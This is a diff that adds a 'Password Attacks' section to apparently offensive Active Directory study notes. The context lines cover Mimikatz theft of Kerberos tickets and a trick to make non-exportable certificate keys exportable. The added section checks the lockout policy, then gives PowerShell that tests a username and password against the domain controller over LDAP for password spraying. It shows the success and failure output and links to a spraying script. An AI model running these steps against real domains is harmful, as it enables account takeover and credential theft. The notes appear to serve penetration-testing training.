@@ -230,10 +230,35 @@ sekurlsa::tickets
 The output shows both a TGT and a TGS. Stealing a TGS would allow us to access only particular resources associated with those tickets. Alternatively, armed with a TGT, we could request a TGS for specific resources we want to target within the domain.
 ### Digital Certificates
 We can rely again on Mimikatz to accomplish this. The crypto module contains the capability to either patch the CryptoAPI function with `crypto::capi` or KeyIso service with `crypto::cng`, making non-exportable keys exportable.
-
-
-
-
+## Password Attacks
+- Get Account lockout policy
+```
+net accounts
+```
+- Password spraying attack using LDAP and ADSI
+```
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$PDC = ($domainObj.PdcRoleOwner).Name
+$SearchString = "LDAP://"
+$SearchString += $PDC + "/"
+$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+$SearchString += $DistinguishedName
+New-Object System.DirectoryServices.DirectoryEntry($SearchString, "<username>", "<password>")
+```
+If the password for the user account is correct, the object creation will be successful:
+```
+distinguishedName : {DC=corp,DC=com}
+Path              : LDAP://DC1.corp.com/DC=corp,DC=com
+```
+If the password is invalid, no object will be created and we will receive an exception:
+```
+format-default : The following exception occurred while retrieving member "distinguishedName": "The user name or
+password is incorrect.
+"
+    + CategoryInfo          : NotSpecified: (:) [format-default], ExtendedTypeSystemException
+    + FullyQualifiedErrorId : CatchFromBaseGetMember,Microsoft.PowerShell.Commands.FormatDefaultCommand
+```
+- [Spray-Passwords.ps1](https://gist.github.com/m3t3kh4n/4d190b021c8189535cee9ebf229a87cd)
 
 
 
